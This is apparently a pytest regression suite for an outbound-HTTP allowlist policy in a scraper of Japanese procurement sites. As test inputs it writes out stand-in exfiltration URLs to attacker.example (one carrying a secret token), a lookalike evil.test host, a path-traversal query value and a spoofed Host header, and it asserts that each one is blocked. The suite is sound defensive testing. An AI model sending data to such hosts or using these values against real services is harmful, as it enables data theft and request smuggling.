# -*- coding: utf-8 -*-

"""外向きHTTP通信ポリシーの回帰テスト。"""

from __future__ import annotations

from collections.abc import Callable
import json

import pytest
import requests

from src.core.scraper import classify_request_failure
from src.models.download_diagnostics import DownloadIssueCode
from src.utils.http_client import DownloadStatus, HTTPClient
from src.utils.outbound_policy import (
    NetworkPolicyReasonCode,
    NetworkPurpose,
    OutboundPolicy,
    OutboundPolicyError,
)


SEARCH_URL = (
    "https://www.i-ppi.jp/IPPI/SearchServices/Web/Search/Search/"
    "Search.aspx?tab=4"
)
DETAIL_URL = (
    "https://www.i-ppi.jp/IPPI/SearchServices/Web/Koji/Keika/"
    "List.aspx?tab=4"
)
CATALOG_URL = (
    "https://www.i-ppi.jp/IPPI/SearchServices/Web/Multi/"
    "SearchHachu.aspx?clear_flg=false&type=koji"
)
DOCUMENT_URL = (
    "https://e2ppiw01.e-bisc.go.jp/CALS/Publish/KokaiBunshoServlet?"
    "AnkenKanriNo=021020002025412000000566&BunshoKanriId=40"
)


def _response(
    request: requests.PreparedRequest,
    status: int,
    *,
    location: str = "",
    content: bytes = b"",
    content_type: str = "text/html; charset=utf-8",
) -> requests.Response:
    response = requests.Response()
    response.status_code = status
    response.url = request.url
    response.request = request
    response.headers["Content-Type"] = content_type
    response.headers["Content-Length"] = str(len(content))
    if location:
        response.headers["Location"] = location
    response._content = content
    response._content_consumed = True
    return response


@pytest.mark.parametrize(
    ("method", "url", "purpose", "endpoint"),
    [
        ("GET", SEARCH_URL, NetworkPurpose.SEARCH, "IPPI_SEARCH"),
        ("POST", SEARCH_URL, NetworkPurpose.SEARCH, "IPPI_SEARCH"),
        (
            "GET",
            CATALOG_URL,
            NetworkPurpose.STARTUP_CATALOG,
            "IPPI_AGENCY_CATALOG",
        ),
        ("POST", DETAIL_URL, NetworkPurpose.DETAIL, "IPPI_PROJECT_DETAIL"),
        (
            "GET",
            "https://www.i-ppi.jp/IPPI/DownloadServices/Web/"
            "UserEntry_Download.aspx?data2=02102000&"
            "data1=021020002025412000000566",
            NetworkPurpose.DOCUMENT_LIST,
            "IPPI_DOCUMENT_LIST",
        ),
        ("GET", DOCUMENT_URL, NetworkPurpose.DOWNLOAD, "EBISC_DOCUMENT"),
    ],
)
def test_policy_allows_only_known_endpoint_shapes(
    method,
    url,
    purpose,
    endpoint,
):
    decision = OutboundPolicy().validate(method, url, purpose)

    assert decision.allowed
    assert decision.endpoint_id == endpoint
    assert decision.reason_code == NetworkPolicyReasonCode.ALLOWED


@pytest.mark.parametrize(
    ("method", "url", "reason"),
    [
        ("GET", SEARCH_URL.replace("https://", "http://"), "HTTPS_REQUIRED"),
        ("GET", SEARCH_URL.replace("www.i-ppi.jp", "i-ppi.jp"), "HOST_NOT_ALLOWED"),
        ("GET", SEARCH_URL.replace("www.i-ppi.jp", "www.i-ppi.jp.evil.test"), "HOST_NOT_ALLOWED"),
        ("GET", SEARCH_URL.replace("www.i-ppi.jp", "www.i-ppi.jp:444"), "PORT_NOT_ALLOWED"),
        ("GET", SEARCH_URL.replace("https://", "https://user@"), "CREDENTIALS_NOT_ALLOWED"),
        ("GET", SEARCH_URL + "#section", "FRAGMENT_NOT_ALLOWED"),
        ("GET", SEARCH_URL.replace("tab=4", "tab=2"), "QUERY_NOT_ALLOWED"),
        ("GET", SEARCH_URL + "&tab=4", "QUERY_NOT_ALLOWED"),
        ("GET", SEARCH_URL + "&extra=1", "QUERY_NOT_ALLOWED"),
        ("PUT", SEARCH_URL, "METHOD_NOT_ALLOWED"),
        (
            "GET",
            "https://www.i-ppi.jp/IPPI/SearchServices/Web/unknown.aspx",
            "ENDPOINT_NOT_ALLOWED",
        ),
        (
            "GET",
            DOCUMENT_URL.replace("BunshoKanriId=40", "BunshoKanriId=../40"),
            "QUERY_NOT_ALLOWED",
        ),
    ],
)
def test_policy_rejects_unsafe_destination_before_transport(
    method,
    url,
    reason,
):
    decision = OutboundPolicy().validate(method, url)

    assert not decision.allowed
    assert decision.reason_code.value == reason


def test_terminal_error_is_only_allowed_as_get_redirect():
    policy = OutboundPolicy()
    error_url = "https://www.i-ppi.jp/information/error.htm"

    direct = policy.validate("GET", error_url)
    redirected = policy.validate(
        "GET", error_url, NetworkPurpose.ERROR, is_redirect=True
    )
    post = policy.validate(
        "POST", error_url, NetworkPurpose.ERROR, is_redirect=True
    )

    assert direct.reason_code == NetworkPolicyReasonCode.TERMINAL_ENDPOINT_ONLY
    assert redirected.allowed
    assert post.reason_code == NetworkPolicyReasonCode.METHOD_NOT_ALLOWED


def test_unknown_network_purpose_is_rejected():
    decision = OutboundPolicy().validate("GET", SEARCH_URL, "UNKNOWN")

    assert not decision.allowed
    assert decision.reason_code == NetworkPolicyReasonCode.PURPOSE_MISMATCH


def test_missing_network_purpose_is_rejected_for_known_endpoint():
    decision = OutboundPolicy().validate("GET", SEARCH_URL)

    assert not decision.allowed
    assert decision.reason_code == NetworkPolicyReasonCode.PURPOSE_MISMATCH


def test_session_preserves_requests_redirect_semantics_and_checks_each_hop():
    calls: list[tuple[str, str]] = []

    def transport(request: requests.PreparedRequest, **_kwargs):
        calls.append((request.method or "", request.url or ""))
        if len(calls) == 1:
            return _response(request, 302, location=DETAIL_URL)
        return _response(request, 200, content=b"detail")

    client = HTTPClient(requests_per_second=0, transport=transport)

    response = client.post(
        SEARCH_URL,
        data={"query": "value"},
        purpose=NetworkPurpose.SEARCH,
    )

    assert response.status_code == 200
    # Requests標準動作どおり、302後のPOSTはGETになる。
    assert [method for method, _url in calls] == ["POST", "GET"]
    assert response.url == DETAIL_URL


@pytest.mark.parametrize(
    "redirect_url",
    [
        "https://attacker.example/collect",
        DOCUMENT_URL,
        "http://www.i-ppi.jp/information/error.htm",
    ],
)
def test_redirect_violation_is_blocked_before_second_transport_call(
    redirect_url,
):
    calls: list[str] = []

    def transport(request: requests.PreparedRequest, **_kwargs):
        calls.append(request.url or "")
        return _response(request, 302, location=redirect_url)

    client = HTTPClient(requests_per_second=0, transport=transport)

    with pytest.raises(OutboundPolicyError) as caught:
        client.get(
            SEARCH_URL,
            max_retries=3,
            purpose=NetworkPurpose.SEARCH,
        )

    assert caught.value.redirect
    assert caught.value.reason_code == "REDIRECT_POLICY_BLOCKED"
    assert calls == [SEARCH_URL]


def test_public_session_is_policy_enforced_and_does_not_use_environment():
    transport: Callable[..., requests.Response] = pytest.fail
    client = HTTPClient(requests_per_second=0, transport=transport)

    assert client.get_session() is client.session
    assert client.session.trust_env is False
    assert client.session.max_redirects == 5
    with pytest.raises(OutboundPolicyError) as caught:
        client.session.get("https://attacker.example/collect")
    assert not caught.value.redirect


def test_environment_proxy_is_ignored(monkeypatch):
    captured: list[object] = []
    monkeypatch.setenv("HTTPS_PROXY", "https://proxy.example:8443")
    monkeypatch.setenv("ALL_PROXY", "socks5://proxy.example:1080")

    def transport(request: requests.PreparedRequest, **kwargs):
        captured.append(kwargs.get("proxies"))
        return _response(request, 200)

    client = HTTPClient(requests_per_second=0, transport=transport)
    response = client.get(
        SEARCH_URL,
        max_retries=1,
        purpose=NetworkPurpose.SEARCH,
    )
    response.close()

    assert captured == [{}]


@pytest.mark.parametrize(
    ("request_kwargs", "reason"),
    [
        ({"proxies": {"https": "https://proxy.example"}}, "PROXY_NOT_ALLOWED"),
        ({"verify": False}, "TLS_VERIFY_REQUIRED"),
        ({"verify": "custom-ca.pem"}, "TLS_VERIFY_REQUIRED"),
        ({"cert": "client.pem"}, "CLIENT_CERT_NOT_ALLOWED"),
        ({"auth": ("user", "secret")}, "AUTH_NOT_ALLOWED"),
        ({"headers": {"Host": "attacker.example"}}, "HOST_HEADER_MISMATCH"),
    ],
)
def test_session_rejects_transport_overrides_before_adapter(
    request_kwargs,
    reason,
):
    calls: list[str] = []

    def transport(request: requests.PreparedRequest, **_kwargs):
        calls.append(request.url or "")
        return _response(request, 200)

    client = HTTPClient(requests_per_second=0, transport=transport)

    with pytest.raises(OutboundPolicyError) as caught:
        client.get(
            SEARCH_URL,
            max_retries=1,
            purpose=NetworkPurpose.SEARCH,
            **request_kwargs,
        )

    assert caught.value.decision.reason_code.value == reason
    assert calls == []


@pytest.mark.parametrize("attribute", ["verify", "cert", "proxies"])
def test_mutating_session_security_defaults_cannot_bypass_policy(attribute):
    calls: list[str] = []

    def transport(request: requests.PreparedRequest, **_kwargs):
        calls.append(request.url or "")
        return _response(request, 200)

    client = HTTPClient(requests_per_second=0, transport=transport)
    unsafe_value = {
        "verify": False,
        "cert": "client.pem",
        "proxies": {"https": "https://proxy.example"},
    }[attribute]
    setattr(client.session, attribute, unsafe_value)

    with pytest.raises(OutboundPolicyError):
        client.get(
            SEARCH_URL,
            max_retries=1,
            purpose=NetworkPurpose.SEARCH,
        )

    assert calls == []


def test_download_policy_failure_is_structured_nonretryable(tmp_path):
    calls: list[str] = []

    def transport(request: requests.PreparedRequest, **_kwargs):
        calls.append(request.url or "")
        return _response(request, 500)

    client = HTTPClient(requests_per_second=0, transport=transport)

    result = client.download_file(
        "https://attacker.example/document.pdf",
        str(tmp_path / "document.pdf"),
        max_retries=3,
    )

    assert result.status == DownloadStatus.FAILED
    assert result.attempts == 1
    assert result.primary_issue is not None
    assert result.primary_issue.code == DownloadIssueCode.OUTBOUND_POLICY_BLOCKED
    assert calls == []


def test_search_policy_failure_is_classified_as_nonretryable():
    policy = OutboundPolicy()
    with pytest.raises(OutboundPolicyError) as caught:
        policy.enforce("GET", "https://attacker.example/collect")

    diagnostic = classify_request_failure(caught.value)

    assert diagnostic.reason_code == "OUTBOUND_POLICY_BLOCKED"
    assert diagnostic.retryable is False


def test_allowed_download_uses_transport_and_keeps_existing_result_contract(
    tmp_path,
):
    payload = b"%PDF-1.7\npolicy test\n%%EOF"
    calls: list[str] = []

    def transport(request: requests.PreparedRequest, **_kwargs):
        calls.append(request.url or "")
        return _response(
            request,
            200,
            content=payload,
            content_type="application/pdf",
        )

    client = HTTPClient(requests_per_second=0, transport=transport)
    destination = tmp_path / "document.pdf"

    result = client.download_file(DOCUMENT_URL, str(destination))

    assert result.status == DownloadStatus.SUCCESS
    assert destination.read_bytes() == payload
    assert calls == [DOCUMENT_URL]


def test_session_audits_preflight_response_and_block_without_query_values(
    tmp_path,
):
    from src.utils.network_audit import NetworkAuditLedger

    audit_path = tmp_path / "network-audit.jsonl"

    def transport(request: requests.PreparedRequest, **_kwargs):
        return _response(request, 200, content=b"ok")

    client = HTTPClient(
        requests_per_second=0,
        transport=transport,
        audit_ledger=NetworkAuditLedger(audit_path),
    )
    response = client.get(
        SEARCH_URL,
        max_retries=1,
        purpose=NetworkPurpose.SEARCH,
    )
    response.close()
    with pytest.raises(OutboundPolicyError):
        client.get(
            "https://attacker.example/collect?token=TOP-SECRET",
            max_retries=1,
            purpose=NetworkPurpose.SEARCH,
        )

    raw = audit_path.read_text(encoding="utf-8")
    assert "TOP-SECRET" not in raw
    records = [json.loads(line) for line in raw.splitlines()]
    assert [record["phase"] for record in records] == [
        "preflight",
        "response",
        "blocked",
    ]
    assert records[1]["http_status"] == 200
    assert records[2]["allowed"] is False
